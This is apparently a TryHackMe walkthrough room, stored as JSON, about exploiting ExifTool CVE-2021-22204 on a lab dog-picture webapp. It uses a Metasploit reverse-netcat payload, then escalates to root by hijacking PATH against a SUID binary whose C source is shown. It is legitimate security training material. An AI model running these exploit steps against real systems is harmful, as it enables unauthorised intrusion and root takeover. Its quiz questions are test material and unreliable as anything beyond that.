{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png', 'title': 'Deja Vu', 'description': 'Exploit a recent code injection vulnerability to take over a website full of cute dog pictures!', 'code': 'dejavu', 'users': 3350, 'tags': ['exiftool', 'cve', 'path exploit', 'privesc', 'webapp', 'web', 'metasploit', 'NinjaJc01'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 246, 'created': '2021-06-09T13:47:15.120Z', 'published': '2021-11-17T19:00:00.559Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': '', 'creator': 'NinjaJc01', 'tasks': [{'taskTitle': 'Deja Vu', 'taskDesc': '<p>This room aims to teach:</p><ul><li>Exploring a webapp to discover potential vulnerabilities</li><li>Exploiting a discovered vulnerability with Metasploit</li><li>Privilege Escalation by PATH exploitation</li></ul><p>While this room is a walkthrough, some elements <b>will</b> rely on individual research and troubleshooting.</p><p>Credit to Varg for the room icon, webapp logo, and design help throughout the webapp.</p><p>Cute animal pictures sourced from the TryHackMe Discord community staff.</p><p>Writeups in the format of a Penetration Testing Report are more than welcome. Other writeup formats will be accepted based on quality and novelty.</p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2021-09-04T09:36:03.354Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '613d16fc8b1088004836bbc3', 'questions': [{'questionNo': 1, 'question': 'Deploy the virtual machine, wait 3-5 minutes for it to boot.', 'hint': ''}]}, {'taskTitle': 'Dog Pictures - Exploring a webapp', 'taskDesc': '<h1>Webapp Enumeration</h1>\n<p>After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it\'s up to\n    date. This just leaves us with a web application to explore.</p>\n<p>From Nmap\'s service version detection, we know that the backend is built in Golang. This hopefully means dynamic\n    content that we can explore.</p>\n<p>The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to\n    discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works.\n    Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can\n    learn more about this technique (and a lot more) in this room: <a href="https://tryhackme.com/room/walkinganapplication" target="_blank">Walking An Application</a>.</p>\n<p>Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.</p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2021-09-04T11:17:53.806Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Click around the website. Can you find any developer comments?', 'hint': ''}, {'questionNo': 2, 'question': 'Can you find the page that gives more details about a dog photo?', 'hint': ''}, {'questionNo': 3, 'question': '<p>Perform an Nmap scan of the target. What version of SSH is in use?</p>', 'hint': ''}]}, {'taskTitle': 'Vulnerability Discovery', 'taskDesc': '<h1>Delving deeper</h1>\n<p>After we\'ve gained a basic familiarity with the site, we can start some more active enumeration. A directory brute\n    force scan can help us discover content that\'s otherwise unreachable through normal browsing, like admin pages or\n    old versions that haven\'t been removed. With admin pages leading to more application features that might not be\n    hardened, or unmaintained code from outdated versions, we\'re more likely to find vulnerabilities.</p>\n<p>Run a gobuster scan with dirb\'s <code>big.txt</code> wordlist. What can you find? Other tools and wordlists are\n    available.</p>\n<p>With an API driven webapp like this, we can see how the application retrieves data to make it dynamic. A great way to\n    do this is Burp Suite, which can automatically map out the target site\'s structure as we explore.</p>\n<h1>Discovering the overly verbose API</h1>\n<p>Burp Suite\'s target site map should have discovered 2 API routes that the website uses to retrieve information about the dog\n    pictures. One retrieves the title and caption, and the other is used to retrieve the date and author. The full paths have been redacted, so that you find them yourself.</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d96207dd832c106398e2267/room-content/03100fff977a5fb2c6c2c4cc3b82a241.png" /><br /></p><p>It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the<a href="https://owasp.org/www-project-api-security/" target="_blank"> OWASP API Top 10</a>, more specifically <code>API3:2019 Excessive Data Exposure</code>. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.</p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2021-11-03T16:43:21.594Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What page can be used to upload your own dog picture?', 'hint': 'Try a gobuster scan as suggested!'}, {'questionNo': 2, 'question': '<p>What API route is used to provide the Title and Caption for a specific dog image?<br /></p>', 'hint': 'Check the BurpSuite Target site map!'}, {'questionNo': 3, 'question': '<p>What API route does the application use to retrieve further information about the dog picture?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp?<br /></p>', 'hint': "Look at the API endpoint from the last question in BurpSuite's target map."}, {'questionNo': 5, 'question': '<p>What version of ExifTool is in use?<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX<br /></p>', 'hint': ''}]}, {'taskTitle': 'Exploitation', 'taskDesc': '<p>Now that we\'ve discovered a potential method of exploiting the box, we should try it!</p><p>Turning our version disclosure into remote code execution massively increases the severity of the issue.</p>\n<h2>Why is this exploit interesting?</h2>\n<p>In the Microsoft ecosystem, there\'s a concept called "Patch Tuesday"; security patches for Microsoft products are\n    often released on Tuesdays.<br />Practically immediately after these patches are released, work begins on creating\n    exploits for the vulnerabilities as many systems will not be immediately updated.</p>\n<p>Exiftool follows a similar story here. In early 2021, an exploit was discovered in Exiftool that could lead to\n    arbitrary code execution. The exploit was quickly patched before public proof of concept code started to appear,\n    however many security enthusiasts began to reverse engineer the patch to create an exploit.</p>\n<h2>Looking for the patch</h2>\n<p>Researching the vulnerability, we can see it was assigned\xa0CVE-2021-22204. Looking at the <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22204" target="_blank">NVD CVE page</a> for the flaw shows that\n    it was patched in 12.24. The page also has a link to the patch, which is very useful here because we can see how\n    they fixed the vulnerability. The git diff is copied below.</p>\n<pre class="lang-perl"><code>-\t230\t# must protect unescaped "$" and "@" symbols, and "\\" at end of string\n-\t231\t$tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\'\\\\\'.($2 || $1)}sge;\n-\t232\t# convert C escape sequences (allowed in quoted text)\n-\t233\t$tok = eval qq{"$tok"};\n+\t230\t# convert C escape sequences, allowed in quoted text\n+\t231\t# (note: this only converts a few of them!)\n+\t232\tmy %esc = ( a =&gt; "\\a", b =&gt; "\\b", f =&gt; "\\f", n =&gt; "\\n",\n+\t233\tr =&gt; "\\r", t =&gt; "\\t", \'"\' =&gt; \'"\', \'\\\\\' =&gt; \'\\\\\' );\n+\t234\t$tok =~ s/\\\\(.)/$esc{$1}||\'\\\\\'.$1/egs;</code></pre>\n<h2>Understanding the code, and the danger</h2>\n<p>The dangerous function here is the call to eval on line 233. Eval is used to run Perl code that\'s contained in a\n    variable, and the variable comes from EXIF data in our image. Control over code that\'s executed is our goal, so it\n    currently seems like the only barrier between us and arbitrary code execution is the filter found on line 231.</p>\n<pre class="lang-perl"><code># must protect unescaped "$" and "@" symbols, and "\\" at end of string\n$tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\'\\\\\'.($2 || $1)}sge;\n</code></pre>\n<p>It\'s worth explaining the\xa0<code style="font-size:14px">=~</code>\xa0that\'s used here. It\'s a Perl operator\n    usually used with regular expressions, and it can be very very complicated. Importantly for us, the first character\n    after the ~ is \'s\'. This means that the operator will perform a search and replace with the regular expression that\n    follows.</p>\n<p>That regular expression is also very complicated, unfortunately. There\'s a helpful comment explaining the intent,\n    escaping special characters in the string. Another unfortunate discovery, if we look at the source code surrounding\n    our filter which wasn\'t captured in the diff, is that this filter also relies on quote marks delimiting the ends of\n    fields.</p>\n<p>Combining all this information, we can see how a code injection vulnerability would arise if we can bypass the filter\n    and have Perl <code>eval</code> our own code.\xa0<span style="font-size:1rem">As this filter is irritating and the\n        exploit is somewhat complex to engineer, we\'ll simply use Metasploit to craft our exploit. Articles describing\n        how an exploit was created manually are included later.</span></p>\n<h2>Creating our exploit with Metasploit</h2><p><span style="font-size:1rem">To create our exploit, we need to first find the Metasploit module for this vulnerability. If you\'re unfamiliar with locating exploits in Metasploit, try the </span><a href="https://tryhackme.com/room/metasploitintro" target="_blank">TryHackMe Metasploit Intro</a><span style="font-size:1rem"> room.</span><br /></p>\n<p>We then need to set our options appropriately for a reverse shell payload. As it\'s a Perl command injection vulnerability, we want a command payload rather than a binary payload. Make sure your LHOST is correct and make sure you start a netcat listener!</p><p><br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            msfconsole\n        </div>\n        <pre class="terminal-code"><code class="lang-html"></code><pre style="color:#bac8d4;font-size:1em">msf6 &gt; search exiftool\n\nMatching Modules\n================\n\n   #  Name                                                      Disclosure Date  Rank       Check  Description\n   -  ----                                                      ---------------  ----       -----  -----------\n   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection\n\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection\n\nmsf6 &gt; use 0\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; show options\n\nModule options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   FILENAME  msf.jpg          yes       Output file\n\n\nPayload options (cmd/unix/reverse_netcat):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.147.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n   **DisablePayloadHandler: True   (no handler will be created!)**\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   JPEG file\n\n\nmsf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; \n        </pre>\n    </pre></div>\n</div>\n\n\n<h2>More information</h2>\n<p>If you didn\'t like my explanations, want to learn more, or you want to see how the proof of concepts were created,\n    please see the links below.</p>\n<ul>\n    <li><a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/" target="_blank">https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</a></li>\n    <li><a href="https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool" target="_blank">https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool</a>\n    </li>\n    <li><a href="https://www.openwall.com/lists/oss-security/2021/05/10/5" target="_blank">https://www.openwall.com/lists/oss-security/2021/05/10/5</a></li>\n</ul>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2021-09-04T14:34:03.833Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Generate an image payload with Metasploit</p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Get code execution on the target machine</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Retrieve the flag located in /home/dogpics/user.txt. What is the user flag?</p>', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Enumeration and PATH Exploitation', 'taskDesc': '<h2>Privesc Enumeration</h2>\n<p>Now that we have code execution, our goal should be rooting the box. Fortunately, something should immediately catch your attention if you run ls -lah from the current working directory. A SUID binary! The presence of one of these in a home directory is quite unusual, but it looks like we have a file left by the server administrator to help manage the webserver. It also looks like we have the source code for this C program, very useful for\xa0<span style="font-size:1rem">exploiting it.</span></p>\n<h2>A note on SELinux</h2>\n<p>SELinux improves security by essentially setting out rules that processes are made to follow. <br />While SELinux can make hacking a box more difficult, it can also make administering a server more difficult. </p><p>Rather than trying to configure SELinux to allow the webserver to bind to port 80, the system administrator just disabled it. This is a somewhat common approach, but is by no means the "correct" approach which would be learning the fundamentals of SELinux and configuring it correctly. With the command <code>getenforce</code>\xa0we can verify whether SELinux is enforcing its rules (the command prints disabled). </p><p>While SELinux doesn\'t affect the privesc we use here, it is worth bearing in mind in real pentests or harder rooms.</p><p>You can read more about SELinux at these links:</p>\n<p><a href="https://selinuxproject.org/page/FAQ" target="_blank">https://selinuxproject.org/page/FAQ</a><a href="https://selinuxproject.org/page/FAQ" target="_blank"></a><br />\n<a href="https://www.redhat.com/en/topics/linux/what-is-selinux" target="_blank">https://www.redhat.com/en/topics/linux/what-is-selinux</a></p>\n<h2>Understanding SUID binaries</h2>\n<p>A SUID binary has special permissions, allowing the program to use the <code>setuid</code> system call.\nThe <code>setuid</code> call allows the process to set its user id. If you call\xa0<code>setuid(0)</code>\xa0and the process has the correct permissions, then the program will then run as root. </p>\n<p>When a program may need to run parts of the code as root but does not want to run the whole program as root, SUID is often used. An example of this would be the webserver Apache2, which initially runs as root to bind to port 80 and then subsequently drops these elevated privileges.</p>\n<p>SUID binaries can only set their UID to the owner of the binary\'s UID unless the binary is owned by root, in which case they can set it to any UID.\nYou usually don\'t have to call <code>setuid</code> yourself, the program will <i>usually</i> do this.</p>\n<p>A more modern alternative to setuid binaries is Linux Capabilities, which offer much more granular control over permissions such as\xa0<code>CAP_NET_BIND_SERVICE</code>\xa0which allows programs to bind to low (privileged, under 1024) ports without running as root. The capability <code>CAP_SET_UID</code> is equivalent to\xa0 suid permissions, allowing the program to call <code>setuid</code></p>\n<h2>What does the vulnerable binary do?</h2>\n<p>If we run the binary, with <code>./serverManager</code>, we get a choice of operations.</p>\n<p>Selecting 0 gives us the status of the webserver service, and 1 allows us to restart it. Restarting the service would usually require root privileges, so it makes some sense that the binary is SUID.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Reverse Shell\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">[dogpics@dejavu ~]$ ./serverManager \nWelcome to the DogPics server manager Version 1.0\nPlease enter a choice:\n0 -\tGet server status\n1 -\tRestart server\n0\n● dogpics.service - Dog pictures\n   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)\n   Active: active (running) since Sat 2021-09-11 18:00:08 BST; 19min ago\n Main PID: 776 (webserver)\n    Tasks: 7 (limit: 5971)\n   Memory: 76.8M\n   CGroup: /system.slice/dogpics.service\n           └─776 /home/dogpics/webserver -p 80\n\nSep 11 18:00:08 dejavu systemd[1]: Started Dog pictures.</code>\n        </pre>\n    </div>\n</div>\n\n\n<p>As we have the source code of the application, we can more easily see the vulnerability.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            serverManager.c - vi\n        </div>\n        <pre class="terminal-code">           <code class="language-c">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{   \n    setuid(0);\n    setgid(0);\n    printf(\n        "Welcome to the DogPics server manager Version 1.0\\n"\n        "Please enter a choice:\\n");\n    int operation = 0;\n    printf(\n        "0 -\\tGet server status\\n"\n        "1 -\\tRestart server\\n");\n    while (operation &lt; 48 || operation &gt; 49) {\n        operation = getchar();\n        getchar();\n        if (operation &lt; 48 || operation &gt; 49) {\n            printf("Invalid choice.\\n");\n        }\n    }\n    operation = operation - 48;\n    //printf("Choice was:\\t%d\\n",operation);\n    switch (operation)\n    {\n    case 0:\n        //printf("0\\n");\n        system("systemctl status --no-pager dogpics");\n        break;\n    case 1:\n        system("sudo systemctl restart dogpics");\n        break;\n    default:\n        break;\n    }\n}</code>\n        </pre>\n    </div>\n</div>\n<p>The vulnerability comes from calling system() without providing a full path to the binary. This means that we can create a fake systemctl binary which will run as root, and escalate our privileges.</p>\n<p>We can also use a program called ltrace which allows us to see system and library calls, although this is not installed on the machine. Pay close attention to the system() seen earlier that provides systemctl without its full path.\xa0</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            james@centos\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">[james@centos]$ ltrace -b -a 100 ./serverManager\nsetuid(0)                                                                                          = -1\nsetgid(0)                                                                                          = -1\nputs("Welcome to the DogPics server ma"...Welcome to the DogPics server manager Version 1.0\nPlease enter a choice:\n)                                                        = 73\nputs("0 -\\tGet server status\\n1 -\\tRestar"...0 -        Get server status\n1 -     Restart server\n)                                                     = 41\ngetchar(0, 0x25d62a0, 0x7f8d48b99860, 0x7f8d488c56480\n)                                              = 48\ngetchar(0, 0x25d66b0, 0x25d66b1, 0x7f8d488c55a5)                                                   = 10\nsystem("systemctl status --no-pager dogp"...● dogpics.service - Dog pictures\n   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)\n   Active: active (running) since Sat 2021-09-11 18:28:17 BST; 6min ago\n Main PID: 894 (webserver)\n    Tasks: 6 (limit: 24819)\n   Memory: 17.9M\n   CGroup: /system.slice/dogpics.service\n           └─894 /home/dogpics/webserver -p 80\n)                                                      = 0</code>\n        </pre>\n    </div>\n</div>\n<h2>Explaining the PATH variable</h2><p>The PATH variable tells the shell where to look for binaries that you call by name, so for example <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">ls</span> is actually <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">/bin/ls</span>.\nIt consists of a sequence of directories, separated by colons.\nYour shell will run the first binary that matches, looking in each directory left to right. This direction is important.<br /></p><h2>What are we exploiting?</h2>\n<p>We\'re exploiting a combination of two things here.</p>\n<p>Firstly, the binary runs as root due to SUID.</p>\n<p>Secondly, the binary calls <code>systemctl</code> with an incomplete path (eg not <code>/usr/bin/systemctl</code>, just <code>systemctl</code> on it\'s own.)</p>\n<p>Because the system will run the first binary it finds from PATH that matches <span style="font-size:14px;background-color:rgb(234, 234, 237)">systemctl</span>\xa0here, we can make our own fake <code>systemctl</code>\xa0to run instead, which will be ran as root (as it inherits the UID and GID of the parent process).</p>\n<p>Our fake <code>systemctl</code> can be as simple as <code>/bin/bash</code> in plaintext to start a new shell - Linux treats executable text files as shell scripts.</p>\n<p>Let\'s create a fake <code>systemctl</code>, add it to path, and get root.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Reverse Shell\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">[dogpics@dejavu ~]$ which systemctl\n/usr/bin/systemctl\n[dogpics@dejavu ~]$ echo \'/bin/bash\' &gt; systemctl\n[dogpics@dejavu ~]$ chmod +x systemctl\n[dogpics@dejavu ~]$ export PATH=.:$PATH\n[dogpics@dejavu ~]$ which systemctl\n./systemctl\n[dogpics@dejavu ~]$ ./serverManager \nWelcome to the DogPics server manager Version 1.0\nPlease enter a choice:\n0 -\tGet server status\n1 -\tRestart server\n0\n[root@dejavu ~]# whoami\nroot\n</code>\n        </pre>\n    </div>\n</div>\n<p>Let\'s break this down:</p>\n<p><code>[dogpics@dejavu ~]$ echo \'/bin/bash\' &gt; systemctl</code> - We\'re creating a plaintext file with the contents <code>/bin/bash</code> which will start a shell when executed.</p>\n<p><code>[dogpics@dejavu ~]$ chmod +x systemctl</code> - We need to make our fake <code>systemctl</code> executable, otherwise it will be ignored.</p>\n<p><code>[dogpics@dejavu ~]$ export PATH=.:$PATH</code> - here, we add <code>.</code> (our current working directory) to the beginning of PATH. This means the system will look in our current working directory for binaries before searching the rest of PATH, and find our fake <code>systemctl</code> before the genuine one.</p>\n<p><code>[dogpics@dejavu ~]$ which systemctl</code> - To check that our fake <code>systemctl</code> will run if the command <code>systemctl</code> is used, we use <code>which</code>. <code>which</code> essentially does the PATH lookup for us and prints the results.</p>\n<p><code>[dogpics@dejavu ~]$ ./serverManager</code> - Run the vulnerable binary!</p>\n<p>From there, you should have a root shell. As a warning, your HOME variable is still <code>/home/dogpics</code> rather than <code>/root</code> so you will need to <code>cd /root</code>. Then just grab the flag.</p>\n<h2>Further reading on this method</h2>\n<p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2021-09-04T14:34:25.278Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Stabilise your reverse shell to ensure that you can run interactive binaries</p>', 'hint': 'This might be difficult without binaries that pentesters usually rely on like Python. There are more ways!'}, {'questionNo': 2, 'question': 'Find the SUID binary', 'hint': ''}, {'questionNo': 3, 'question': '<p>Verify (based on output) that the serverManager program runs systemctl when you run it.<br />Try running the same command as the binary yourself - <code>systemctl status dogpics --no-pager<code></code></code></p>', 'hint': ''}, {'questionNo': 4, 'question': "<p>Create your fake systemctl, ensure it's correctly added to PATH, and escalate your privileges.</p>", 'hint': ''}, {'questionNo': 5, 'question': '<p>Retrieve the root flag from /root/root.txt. What is the root flag?</p>', 'hint': ''}]}]}